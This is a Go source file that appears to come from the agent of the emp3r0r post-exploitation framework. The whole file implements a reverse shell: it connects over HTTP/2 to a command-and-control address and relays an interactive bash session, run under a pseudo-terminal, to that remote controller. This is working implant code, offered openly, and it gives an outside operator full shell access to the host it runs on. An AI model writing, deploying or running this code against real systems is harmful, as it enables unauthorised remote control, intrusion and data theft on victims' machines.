package agent

import (
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"

	"github.com/creack/pty"
	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
	"golang.org/x/crypto/ssh/terminal"
)

// ActivateShell launch reverse shell and send it to CC
func ActivateShell() {
	var (
		err       error
		streamURL = CCAddress + tun.StreamAPI

		conn        *h2conn.Conn // reverse shell uses this connection
		isShellExit = false      // when to exit
	)

	conn, _, _, err = ConnectCC(streamURL)
	defer func() {
		err = conn.Close()
		if err != nil {
			log.Print("Closing reverseBash connection: ", err)
		}
		log.Print("Closed shell connection")
	}()

	go reverseShell(SendCC, RecvCC, &isShellExit)

	go func() {
		for {
			if isShellExit {
				return
			}
			data := make([]byte, BufSize)
			_, err = conn.Read(data)
			if err != nil {
				log.Print("Read remote: ", err)
				isShellExit = true
				return
			}
			RecvCC <- data
		}
	}()

	for outgoing := range SendCC {
		if isShellExit {
			return
		}
		_, err = conn.Write(outgoing)
		if err != nil {
			log.Print("Send to remote: ", err)
			isShellExit = true
		}
	}
}

// reverseShell - Execute a reverse shell to host
func reverseShell(send chan<- []byte, recv <-chan []byte, finished *bool) {
	cmd := exec.Command("bash", "-li")

	shellf, err := pty.Start(cmd)
	if err != nil {
		log.Print("start bash: ", err)
		return
	}

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, shellf); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.

	// Set stdin in raw mode.
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		log.Print("MakeRaw: ", err)
	}
	defer func() {
		err = shellf.Close()
		if err != nil {
			log.Print("Closing shellf: ", err)
		}
		*finished = true
		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
		log.Print("reverseShell exited")
	}()

	// write CC's input to bash's PTY stdin
	go func() {
		for incoming := range recv {
			if strings.HasPrefix(string(incoming), "exit\n") {
				log.Print("Exiting due to 'exit' command")
				err = cmd.Process.Kill()
				if err != nil {
					log.Print("failed to kill bash shell: ", err)
				}
				log.Print("Killed bash shell")
				return
			}
			_, err := shellf.Write(incoming)
			if err != nil {
				log.Print("shell write stdin: ", err)
				return
			}
		}
	}()

	// read from bash's PTY output
	for {
		buf := make([]byte, BufSize)
		_, err = shellf.Read(buf)
		send <- buf
		if err != nil {
			log.Print("shell read: ", err)
			return
		}
	}
}
